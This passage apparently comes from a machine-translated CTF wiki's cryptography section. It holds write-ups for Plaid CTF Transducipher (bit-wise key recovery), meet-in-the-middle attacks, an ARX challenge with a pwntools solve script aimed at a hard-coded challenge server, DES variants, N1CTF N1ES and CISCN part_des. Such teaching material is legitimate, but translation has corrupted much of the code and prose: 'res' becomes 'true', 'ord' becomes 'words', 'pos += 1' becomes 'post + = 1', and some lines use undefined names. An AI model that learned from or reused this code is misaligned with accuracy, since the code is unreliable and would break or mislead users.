2)\n\n\n\n\n\ndef transduce(b, s=0):\n\nif len (b) == 0:\n        return b\n\n    d, t = T[s]\n\n    b0, bp = b[0], b[1:]\n\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n\n\n\n\n\ndef transduceblock(b):\n\n    return bin2block(transduce(block2bin(b)))\n\n\n\n\n\ndef swap(b):\n\n    l = BLOCK_SIZE // 2\n\n    m = (1 &lt;&lt; l) - 1\n\n    return (b &gt;&gt; l) | ((b &amp; m) &lt;&lt; l)\n\n\n\n\n\nclass Transducipher:\n\n\n\n    def __init__(self, k):\n\nself.k = [k]\n        for i in range(1, len(T)):\n\n            k = swap(transduceblock(k))\n\n            self.k.append(k)\n\n\n\n    def encrypt(self, b):\n\n        for i in range(len(T)):\n\n            b ^= self.k[i]\n\n            b = transduceblock(b)\n\n            b = swap(b)\n\n        return b\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    flag = bytes.hex(os.urandom(BLOCK_SIZE // 8))\n\n    k = int(flag, 16)\n\n    C = Transducipher(k)\n\n    print(\"Your flag is PCTF{%s}\" % flag)\n\n    with open(\"data1.txt\", \"w\") as f:\n\n        for i in range(16):\n\n            pt = int(bytes.hex(os.urandom(BLOCK_SIZE // 8)), 16)\n\n            ct = C.encrypt(pt)\n\n            f.write(str((pt, ct)) + \"\\n\")\n</code></pre> <p>The topic gave 16 groups of ciphertext pairs.</p> <ul> <li>Clear text size 8 bytes</li> <li>cipher text size 8 bytes</li> <li>The key size is also 8 bytes</li> </ul> <p>The key we need to solve is the key.</p> <p>It can be seen that there are two main operations here.</p> <ul> <li>swap</li> </ul> <pre><code>def swap(b):\n\n    l = BLOCK_SIZE // 2\n\n    m = (1 &lt;&lt; l) - 1\n\n    return (b &gt;&gt; l) | ((b &amp; m) &lt;&lt; l)\n</code></pre> <p>Swaps the upper 32 bits of the given data with the lower 32 bits.</p> <ul> <li>transduce</li> </ul> <pre><code>T = [\n\n    ((2, 1), 1),\n\n    ((5, 0), 0),\n\n    ((3, 4), 0),\n\n    ((1, 5), 1),\n\n    ((0, 3), 1),\n\n    ((4, 2), 0),\n\n]\n\ndef transduce(b, s=0):\n\nif len (b) == 0:\n        return b\n\n    d, t = T[s]\n\n    b0, bp = b[0], b[1:]\n\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n</code></pre> <p>among them,</p> <ul> <li>b is an array of 01 with an initial time size of 64.</li> <li>s is a subscript.</li> </ul> <p>The basic process is as follows</p> <ol> <li>Select which element of T to use based on s and divide it into d and t.</li> <li>Divide b into two parts, one containing only the head element and the other containing the other elements.</li> <li>XOR the header element with t as the current header element and continue to convert the rest.</li> </ol> <p>In fact, we can convert this function into an iterative function.</p> <pre><code>def transduce_iter(b, s=0):\n\nans = []\n    for c in b:\n\n        d, t = T[s]\n\nyears + = [ct]\n        s = d[c]\n\nreturn years\n</code></pre> <p>And since each time the first element of the list is processed, the function is actually reversible, as follows</p> <pre><code>def invtransduce(b, s=0):\n\nif len (b) == 0:\n        return b\n\n    d, t = T[s]\n\n    b0, bp = b[0], b[1:]\n\n    return [b0 ^ t] + transduce(bp, s=d[b0 ^ t])\n</code></pre> <p>The following is the core flow of the analysis program. The first is to generate the key part. The encryption algorithm generates 6 keys, each time the method is generated.</p> <ol> <li>transduce the previous key to get the intermediate value t</li> <li>Swap t</li> <li>Continuous iteration 5 times</li> </ol> <pre><code>    def __init__(self, k):\n\nself.k = [k]\n        for i in range(1, len(T)):\n\n            k = swap(transduceblock(k))\n\n            self.k.append(k)\n</code></pre> <p>The encryption algorithm is as follows, a total of 6 iterations, the basic process</p> <p>XOR key transduce 2. Exchange</p> <pre><code>    def encrypt(self, b):\n\n        for i in range(len(T)):\n\n            b ^= self.k[i]\n\n            b = transduceblock(b)\n\n            b = swap(b)\n\n        return b\n</code></pre> <p>Through the analysis program, it can be known that the encryption algorithm is a block encryption, and the basic information is as follows</p> <ul> <li>Block size is 8 bytes</li> <li>Rounds of 6 rounds</li> <li>The basic operations of each round of the encryption algorithm are transduce and swap.</li> <li>The extension of the key is also related to transduce and swap.</li> </ul> <p>more specific</p> <ol> <li>swap is to swap the upper 32 bits of the 8 bytes with the lower 32 bits.</li> <li>transduce is XORed to a value bit by bit for each bit of 8 bytes. This value is related to T.</li> </ol> <p>Through further analysis, we can find that these two functions are all reversible. That is to say, if we know the final ciphertext, then we can actually shorten the original number of rounds to almost 5 rounds, because the last round of <code>transduce</code> and <code>swap</code> have no effect.</p> <p>We can define the following variables</p> Name Meaning <p>| k_{i,0} | The upper 32 bits of the key used in the i-th round | | k_{i,1} | The lower 32 bits of the key used in the i-th round | | d_{i,0} | The upper 32 bits of the input used by the i-th wheel | | d_{i,1} | The lower 32 bits of the input used by the i-th wheel |</p> <p>Since one of the core operations is swap, only high or low 32 bits are manipulated, so we can consider it in two parts. The simplified definition is as follows</p> <ul> <li>Transduce is simplified to T, although it conflicts with the source code, but we can temporarily understand it.</li> <li>Swap is reduced to S.</li> </ul> <p>Then each round of the ciphertext, the key is as follows</p> Number of rounds Left key Left ciphertext Right key Right ciphertext <p>| 0    | k_{0,0}              | d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) | k_{0,1}            | d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) |</p> <p>| 1    | k_{1,0}=T(k_{0,1},s) | d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) | k_{1,1}=T(k_{0,0}) | d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) |</p> <p>| 2    | k_{2,0}=T(k_{1,1},s) | d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) | k_{2,1}=T(k_{1,0}) | d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) |</p> <p>| 3    | k_{3,0}=T(k_{2,1},s) | d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) | k_{3,1}=T(k_{2,0}) | d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) |</p> <p>| 4    | k_{4,0}=T(k_{3,1},s) | d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) | k_{4,1}=T(k_{3,0}) | d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) |</p> <p>| 5    | k_{5,0}=T(k_{4,1},s) | d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) | k_{5,1}=T(k_{4,0}) | d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) |</p> <p>Then, we can enumerate the upper 32 bits of k bit by bit and enumerate the possible s status bits when performing the T operation, so that we can get the high 32-bit key. After performing a bit-by-bit blast, we can get two possible results</p> <pre><code>[2659900894, 2659900895]\n</code></pre> <p>According to the results on the left, you can get the possible results on the right. The possible results obtained with 2659900894 are as follows:</p> <pre><code># The first set of ciphertexts may have too many corresponding keys.\n# The second group has a total of 6.\n[2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155]\n\n# The third group\n[2764038144, 2764038145]\n</code></pre> <p>Then in fact, we can manually try to encrypt all the ciphertext, if not, just judge the error directly. This can actually be filtered very quickly. Finally, you can find that the key is</p> <pre><code>2659900894|2764038145\n</code></pre> <p>That is 11624187353095200769. Also got the flag.</p> <p>Of course, this problem can also use the attack method of the middle encounter, that is, the key used in the 0<sup>th</sup> round and the key used in the last round are respectively enumerated to make a collision in the third round.</p>"},{"location":"crypto/attack-summary/bit-attack/#reference","title":"Reference","text":"<ul> <li>http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/</li> </ul>"},{"location":"crypto/attack-summary/meet-in-the-middle/","title":"\u4e2d\u9047\u9047\u653b\u51fb- MITM","text":""},{"location":"crypto/attack-summary/meet-in-the-middle/#overview","title":"Overview","text":"<p>The middle encounter attack is an attack method that exchanges space for time. It was proposed by Diffie and Hellman in 1977. From a personal point of view, people refer more to an idea, not only for cryptographic attacks, but also for other aspects, which can reduce the complexity of the algorithm.</p> <p>The basic principle is as follows</p> <p>Suppose E and D are encryption functions and decryption functions, respectively, k1 and k2 are the keys used for two encryptions respectively, then we have</p> <p>$ C = E k_2 (E k_1 (P)) $</p> <p>P=D_{k_2}(D_{k_1}(C))</p> <p>Then we can launch</p> <p>E_{k_1}(P)=D_{k_2}(C)</p> <p>Then, when the user knows a pair of plaintext and ciphertext</p> <ol> <li>An attacker can enumerate all k1s, store all the encrypted results of P, and sort them according to the size of the ciphertext.</li> <li>The attacker further enumerates all k2, decrypts ciphertext C to get C1, and searches for C1 in the result of the first step of encryption. If we search, we can think that we have found the correct k1. And k2.</li> <li>If you feel that the results obtained in the second step are not insured, we can also find some clear cipher pairs to verify.</li> </ol> <p>Assuming that the key lengths for both k1 and k2 are n, then our violent enumeration would require O(n^2), now we only need O(n log_2n).</p> <p>This is similar to the middle encounter attack of 2DES.</p>"},{"location":"crypto/attack-summary/meet-in-the-middle/#topic","title":"topic","text":"<ul> <li>2018 National Crackmec, see the Wiki AES section</li> <li>2018 Plaid CTF Transducipher, see the principle of the bit attack section.</li> <li>2018 National CrackMe, see the discrete logarithmic part of the Wiki integer field</li> <li>2018 WCTF RSA, see wiki RSA Complex section</li> </ul>"},{"location":"crypto/attack-summary/meet-in-the-middle/#references","title":"references","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A</li> </ul>"},{"location":"crypto/basic/introduction/","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6","text":"<p>This section will introduce \"Basic Mathematical Knowledge\", which is quoted here, so it is not really true. .</p>"},{"location":"crypto/blockcipher/arx-operations/","title":"Add-Rotate-Xor","text":""},{"location":"crypto/blockcipher/arx-operations/#overview","title":"Overview","text":"<p>The ARX operation is a general term for the following three basic operations. - Add Modification on the finite field - Rotate circular shift - Xor XOR</p> <p>There are many common block cipher algorithms that use only these three basic operations in a round function. Typical examples are Salsa20, Speck, and so on. In addition, [IDEA] (./idea.md) also uses a similar basic operation to construct the encryption and decryption operation, but replaces the shift by multiplication.</p>"},{"location":"crypto/blockcipher/arx-operations/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":""},{"location":"crypto/blockcipher/arx-operations/#advantages","title":"Advantages","text":"<ul> <li>Easy operation and fast operation</li> <li>Execution time is constant to avoid time-based channel attack</li> <li>The combined function is sufficiently expressive (see example below)</li> </ul>"},{"location":"crypto/blockcipher/arx-operations/#disadvantages","title":"Disadvantages","text":"<ul> <li>Among the three basic operations, Rotate and Xor are completely linear operations for a single bit, which may cause some vulnerability (see [Rotational cryptanalysis] (https://en.wikipedia.org/wiki/ Rotational_cryptanalysis))</li> </ul>"},{"location":"crypto/blockcipher/arx-operations/#topic","title":"topic","text":""},{"location":"crypto/blockcipher/arx-operations/#2018-ctf-primitive","title":"2018 *ctf primitive","text":""},{"location":"crypto/blockcipher/arx-operations/#analysis","title":"Analysis","text":"<p>This problem requires us to combine a certain number of Add-Rotate-Xor operations, so that the obtained encryption algorithm can encrypt the fixed plaintext into a specified random ciphertext, that is, construct an arbitrary permutation function through the basic operation. The flag is obtained after 3 successful builds.</p>"},{"location":"crypto/blockcipher/arx-operations/#problem-solving","title":"Problem Solving","text":"<p>For the operation under modulo 256, a typical ARX-based transposition operation can be expressed as the following combination <pre><code>RotateLeft_1(Add_255(RotateLeft_7(Add_2(x))))\n</code></pre></p> <p>The above function corresponds to a permutation operation that swaps 254 and 255 while keeping other numbers unchanged.</p> <p>Intuitively, since the carry occurs in the modulo plus 2 operation of the first step, only the input is 254, 255, the combined function can treat this situation differently.</p> <p>Using the above atomic operations, we can construct a permutation of any two numbers 'a, b`. Combined with the Xor operation, we can reduce the number of basic operations required to meet the limitations given by the title. One possible operational step is as follows:</p> <ol> <li>For <code>a, b</code>, make <code>a</code> 0 by modular operation</li> <li>Move to the right by making the lowest bit of b</li> <li>If <code>b</code> is not 1, perform the <code>Xor 1, Add 255</code> operation, keeping <code>a</code> still 0 and decreasing the value of <code>b</code></li> <li>Repeat operation 2-3 until <code>b</code> is 1</li> <li>Perform <code>Add 254</code> and transposition operations, exchanging <code>a, b</code></li> <li>For all operations except transposition, add the corresponding inverse operation to ensure that the values other than <code>a, b</code> are unchanged.</li> </ol> <p>The complete solution script is as follows:</p> <pre><code>from pwn import *\nimport string\nfrom hashlib import sha256\n\n#context.log_level='debug'\n\ndef dopow():\n    chal = c.recvline ()\n    post = chal [12:28]\n    tar = chal [33: -1]\n    c.recvuntil(':')\n    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)\n    c.sendline(found)\n\n#c = remote('127.0.0.1',10001)\nc = remote('47.75.4.252',10001)\ndopow()\npt='GoodCipher'\n\ndef doswap(a,b):\n    if a==b:\n        return\n    if a&gt;b:\n        tmp=b\n        b=a\n        a=tmp\n    ans=[]\n    ans.append((0,256-a))\n    b-=a\n    a=0\n    while b!=1:\n        tmp=0\n        lo=1\n        while b&amp;lo==0:\n            lo&lt;&lt;=1\n            tmp+=1\n        if b==lo:\n            ans.append((1,8-tmp))\n            break\n        if tmp!=0:\n            ans.append((1,8-tmp))\n        b&gt;&gt;=tmp\n        ans.append((2,1))\n        b^=1\n        ans.append((0,255))\n        b-=1\n    ans.append((0,254))\n\n    for a,b in ans:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in [(0,2),(1,7),(0,255),(1,1)]:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in ans[::-1]:\n        if a==0:\n            c.sendline('%d %d'%(a,256-b))\n        elif a==1:\n            c.sendline('%d %d'%(a,8-b))\n        elif a==2:\n            c.sendline('%d %d'%(a,b))\n        c.recvline()\n\nfor i in range(3):\n    print i\n    m=range(256)\n    c.recvuntil('ciphertext is ')\n    ct=c.recvline().strip()\n    ct=ct.decode('hex')\n    assert len(ct)==10\n    for i in range(10):\n        a=ord(ct[i])\n        b=ord(pt[i])\n        #print m[a],b\n        doswap(m[a],b)\n        for j in range(256):\n            if m[j]==b:\n                m[j]=m[a]\n                m[a]=b\n                break\n    c.sendline('-1')\n\nc.recvuntil('Your flag here.\\n')\nprint c.recvline()\n</code></pre>"},{"location":"crypto/blockcipher/des/","title":"DES","text":""},{"location":"crypto/blockcipher/des/#basic-introduction","title":"basic introduction","text":"<p>Data Encryption Standard (DES), a data encryption standard, is a typical block encryption. The basic information is as follows:</p> <ul> <li>Enter 64 bits.</li> <li>Output 64 bits.</li> <li>The key is 64 bits, using 56 bits of the 64-bit key, and the remaining 8 bits are either discarded or used as parity bits.</li> <li>Feistel iterative structure</li> <li>The plaintext is ciphered after 16 iterations.</li> <li>The ciphertext is plaintext after a similar 16 iterations.</li> </ul>"},{"location":"crypto/blockcipher/des/#basic-process","title":"Basic Process","text":"<p>Give a simple [DES Flowchart] (http://homepage.usask.ca/~dtr467/400/).</p> <p></p>"},{"location":"crypto/blockcipher/des/#encryption","title":"Encryption","text":"<p>We can consider each round of encryption process</p> <p>L_{i+1}=R_i</p> <p>R_{i+1}=L_i\\oplus F(R_i,K_i)</p> <p>Then before the last Permutation, the corresponding ciphertext is (R_{n+1}, L_{n+1}).</p>"},{"location":"crypto/blockcipher/des/#decryption","title":"Decryption","text":"<p>So how does decryption decrypt it? First, we can reverse the ciphertext first, then we can get the final round of output. We will consider each round at this time.</p> <p>R_i=L_{i+1}</p> <p>L_i=R_{i+1}\\oplus F(L_{i+1},K_i)</p> <p>Therefore, (L_0,R_0) is the plaintext after the first replacement when encrypting. We only need to perform the inverse permutation to get the plaintext.</p> <p>It can be seen that DES encryption and decryption uses the same set of logic, except that the order in which the keys are used is inconsistent.</p>"},{"location":"crypto/blockcipher/des/#core-components","title":"Core components","text":"<p>The core components in DES mainly include (only the encryption process is given here)</p> <ul> <li>initial replacement</li> <li>F function</li> <li>E extension function</li> <li>S box, design criteria not given.</li> <li>P replacement</li> <li>Last replacement</li> </ul> <p>Where the F function is as follows</p> <p></p> <p>If you are more interested in DES, you can study it more closely. Welcome to PR.</p>"},{"location":"crypto/blockcipher/des/#derivative","title":"derivative","text":"<p>Based on DES, the following two encryption methods are derived.</p> <ul> <li>Double DES</li> <li>Three DES</li> </ul>"},{"location":"crypto/blockcipher/des/#dual-des","title":"Dual DES","text":"<p>Dual DES uses two keys and is 112 bits long. Encryption method is as follows</p> <p>$ C = E_ {k2} (E_ {k1} (P)) $</p> <p>But dual DES can't resist the middle encounter attack, we can construct the following two sets</p> <p>$ I = {E_ {k1} (P)} $</p> <p>J=D_{k2}(C)</p> <p>That is, respectively enumerate K1 and K2 to encrypt P and decrypt C respectively.</p> <p>After we encrypt P, we can sort the encryption results. The complexity is 2^nlog(2^n)=O(n2^n)</p> <p>When we decrypt C, we can go to the corresponding table for each decryption.</p> <p>The total complexity is still O(n2^n).</p>"},{"location":"crypto/blockcipher/des/#triple-des","title":"Triple DES","text":"<p>Triple DES encryption and decryption methods are as follows</p> <p>C=E_{k3}(D_{k2}(E_{k1}(P)))</p> <p>P=D_{k1}(E_{k2}(D_{k3}(C)))</p> <p>There are two ways to choose a key.</p> <ul> <li>3 different keys, k1, k2, k3 are independent of each other, a total of 168 bits.</li> <li>2 different keys, k1 and k2 are independent, k3 = k1, 112 bits.</li> </ul>"},{"location":"crypto/blockcipher/des/#attack-method","title":"Attack method","text":"<ul> <li>Differential attack</li> <li>Linear attack</li> </ul>"},{"location":"crypto/blockcipher/des/#2018-n1ctf-n1es","title":"2018 N1CTF N1ES","text":"<p>The basic code is as follows</p> <pre><code># -*- coding: utf-8 -*-\n\ndef round_add(a, b):\n\n    f = lambda x, y: x + y - 2 * (x &amp; y)\n\ntrue = &amp;#39;&amp;#39;\n    for i in range(len(a)):\n\nres + = chr (f (words (a [i]), words (b [i])))\n    return res\n\n\n\ndef permutate(table, block):\n\n    return list(map(lambda x: block[x], table))\n\n\n\ndef string_to_bits(data):\n\n    data = [ord(c) for c in data]\n\nl = len (data) * 8\n    result = [0] * l\npost = 0\n    for ch in data:\n\n        for i in range(0,8):\n\n            result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1\n\npost + = 1\n    return result\n\n\n\ns_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 8\n\n9, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156,\n\n 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]\n\n\n\ndef generate(o):\n\nk = permutate (s_box, o)\n    b = []\n\n    for i in range(0, len(k), 7):\n\n        b.append(k[i:i+7] + [1])\n\n    c = []\n\n    for i in range(32):\n\npost = 0\n        x = 0\n\n        for j in b[i]:\n\n            x += (j&lt;&lt;pos)\n\npost + = 1\n        c.append((0x10001**x) % (0x7f))\n\n    return c\n\n\n\n\n\n\n\nclass N1ES:\n\n    def __init__(self, key):\n\n        if (len(key) != 24 or isinstance(key, bytes) == False ):\n\n            raise Exception(\"key must be 24 bytes long\")\n\n        self.key = key\n\n        self.gen_subkey()\n\n\n\n    def gen_subkey(self):\n\n        o = string_to_bits(self.key)\n\nk = []\n        for i in range(8):\n\no = generate (o)\n            k.extend(o)\n\n            o = string_to_bits([chr(c) for c in o[0:24]])\n\n        self.Kn = []\n\n        for i in range(32):\n\n            self.Kn.append(map(chr, k[i * 8: i * 8 + 8]))\n\n        return\n\n\n\n    def encrypt(self, plaintext):\n\n        if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):\n\n            raise Exception(\"plaintext must be a multiple of 16 in length\")\n\ntrue = &amp;#39;&amp;#39;\n        for i in range(len(plaintext) / 16):\n\n            block = plaintext[i * 16:(i + 1) * 16]\n\n            L = block[:8]\n\n            R = block[8:]\n\n            for round_cnt in range(32):\n\n                L, R = R, (round_add(L, self.Kn[round_cnt]))\n\n            L, R = R, L\n\n            res += L + R\n\n        return res\n</code></pre> <p>Obviously, we can think of it as a way of Feistel encryption, the decryption function is as follows</p> <pre><code>    def decrypt(self,ciphertext):\n\ntrue = &amp;#39;&amp;#39;\n        for i in range(len(ciphertext) / 16):\n\n            block = ciphertext[i * 16:(i + 1) * 16]\n\n            L = block[:8]\n\n            R = block[8:]\n\n            for round_cnt in range(32):\n\n                L, R =R, (round_add(L, self.Kn[31-round_cnt]))\n\n            L,R=R,L\n\n            res += L + R\n\n        return res\n</code></pre> <p>The final result is</p> <pre><code>\u279c  baby_N1ES cat challenge.py\n\nfrom N1ES import N1ES\n\nimport base64\n\nkey = \"wxy191iss00000000000cute\"\n\nn1es = N1ES(key)\n\nflag = \"N1CTF{*****************************************}\"\n\ncipher = n1es.encrypt(flag)\n\n#print base64.b64encode(cipher)  # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx\n\ncipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'\n\ncipher = base64.b64decode(cipher)\n\nprint n1es.decrypt(cipher)\n\n\u279c  baby_N1ES python challenge.py\n\nN1CTF {F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d _ / - /}\n</code></pre>"},{"location":"crypto/blockcipher/des/#2019-ciscn-part_des","title":"2019 CISCN part_des","text":"<p>The title only gave one file:</p> <pre><code>Round n part_encode-&gt; 0x92d915250119e12b\n\nKey map -&gt; 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84\n</code></pre> <p>Considering the title name and data characteristics, <code>Round n part_encode</code> is the intermediate result of executing n rounds of des, and <code>Key map</code> should be the subkey of des. To restore the plaintext, only the reverse process of n rounds of des encryption can be performed. Pay attention to the following three points when decrypting.</p> <ul> <li>Subkey selection, for only n rounds of encryption results, the decryption should use the keys n, n-1..., 1 in sequence.</li> <li>des After the last round of operations, the unfinished des does not exchange the left and right parts and the inverse initial permutation, so we should perform these two steps on the ciphertext first.</li> <li>n choice, in this question, we don't know n, but it doesn't matter, we can try all possible values (0-15) flag should be ascii string.</li> </ul> <p>??? note \"Solution code\"     ``` python</p> <p>kkk = 16     def bit_rot_left(lst, pos):</p> <pre><code>    return lst[pos:] + lst[:pos]\n\n\n\nclass DES:\n\n    IP = [\n\n            58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,\n\n            62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,\n\n            57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,\n\n            61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7\n\n        ]\n\n    IP_re = [\n\n            40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,\n            38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,\n\n            36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,\n\n            34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25\n\n        ]\n\n    Pbox = [\n\n            16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,\n\n            2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25\n\n        ]\n</code></pre> <p>E = [                 32,1,2,3,4,5,4,5,6,7,8,9,</p> <pre><code>            8,9,10,11,12,13,12,13,14,15,16,17,\n\n            16,17,18,19,20,21,20,21,22,23,24,25,\n\n            24,25,26,27,28,29,28,29,30,31,32,1\n\n        ]\n\n    PC1 = [\n\n                57,49,41,33,25,17,9,1,58,50,42,34,26,18,\n\n                10,2,59,51,43,35,27,19,11,3,60,52,44,36,\n\n                63,55,47,39,31,23,15,7,62,54,46,38,30,22,\n\n                14,6,61,53,45,37,29,21,13,5,28,20,12,4\n\n        ]\n\n    PC2 = [\n\n            14,17,11,24,1,5,3,28,15,6,21,10,\n\n            23,19,12,4,26,8,16,7,27,20,13,2,\n\n            41,52,31,37,47,55,30,40,51,45,33,48,\n\n            44,49,39,56,34,53,46,42,50,36,29,32\n\n        ]\n</code></pre> <p>Sbox = [                 [</p> <pre><code>                [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\n\n                [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\n\n                [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\n\n                [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],\n\n            ],\n\n            [\n\n                [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],\n\n                [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],\n\n                [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],\n\n                [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],\n\n            ],\n\n            [\n\n                [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],\n\n                [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],\n\n                [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],\n\n                [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],\n\n            ],\n\n            [\n\n                [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],\n\n                [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],\n\n                [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],\n\n                [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],\n\n            ],\n\n            [\n\n                [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],\n\n                [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],\n\n                [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],\n\n                [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],\n\n            ],\n\n            [\n\n                [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],\n\n                [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],\n\n                [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],\n\n                [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],\n\n            ],\n\n            [\n\n                [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],\n\n                [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],\n\n                [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],\n\n                [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],\n\n            ],\n\n            [\n\n                [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],\n\n                [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],\n\n                [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],\n\n                [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11],\n\n            ]\n\n        ]\n\n    rout = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]\n\n    def __init__(self):\n\n        self.subkey = [[[1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 